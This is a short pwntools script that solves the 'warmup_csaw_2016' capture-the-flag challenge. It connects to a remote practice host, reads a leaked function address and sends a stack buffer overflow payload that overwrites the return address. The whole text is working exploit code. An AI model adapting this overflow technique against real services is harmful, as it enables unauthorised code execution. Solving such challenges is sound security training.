from pwn import *

#r=process('./warmup_csaw_2016')
r=remote("node5.buuoj.cn",25897)

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
# gdb.attach(r)

r.recvline()
s=r.recvline()
addr=int(s[6:],16)
print(hex(addr))

payload=b'b'*0x48+p64(addr)
print(r.recv(1))
r.sendline(payload)
print(r.recvline())